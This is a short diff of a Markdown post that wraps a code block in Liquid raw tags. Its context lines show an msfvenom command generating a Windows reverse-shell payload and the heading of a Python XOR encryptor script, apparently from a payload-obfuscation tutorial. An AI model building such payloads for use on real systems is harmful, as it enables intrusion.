@@ -587,7 +587,8 @@ msfvenom -p windows/x64/shell_reverse_tcp \
 ```
 
 **Step 2: Python XOR Encryptor — `xor_encrypt.py`**
-
+```liquid
+{% raw %}
 ```bash
 #!/usr/bin/env python3
 """
@@ -663,7 +664,7 @@ def main():
 if __name__ == "__main__":
     main()
 ```
-
+{% endraw %}
 
 **Usage:**
 
